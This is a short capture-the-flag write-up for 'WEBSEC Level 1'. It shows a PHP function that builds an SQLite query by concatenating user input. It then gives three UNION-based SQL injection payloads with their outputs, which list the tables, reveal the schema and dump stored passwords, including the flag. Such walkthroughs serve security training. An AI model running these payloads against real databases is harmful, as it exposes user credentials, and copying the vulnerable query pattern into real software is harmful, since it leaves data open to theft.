#WEBSEC Level 1


## Challenge description
Nothing fancy


## Initial analysis

```class LevelOne {
    public function doQuery($injection) {
        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
        
        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query($query);
        $users = $getUsers->fetchArray(SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}
```

## Walk through

STEP 1: `0 union SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type = 'table'--`
OUTPUT: Other User Details: id -> 1 username -> users (Table name)

STEP 2: `0 union select 1,sql from sqlite_master--`
OUTPUT: Other User Details: id -> 1 username -> CREATE TABLE users(id int(7), username varchar(255), password varchar(255)) (Column name)

STEP 3: `0 UNION SELECT 1, GROUP_CONCAT(password) FROM users--`
OUTPUT: Other User Details: id -> 1 username -> UnrelatedPassword, ExampleUserPassword, WEBSEC{Simple_SQLite_Injection}

## Flag

**FLAG**: `WEBSEC{Simple_SQLite_Injection}`

For further queries, please DM me on Twitter: <https://twitter.com/m0n574>.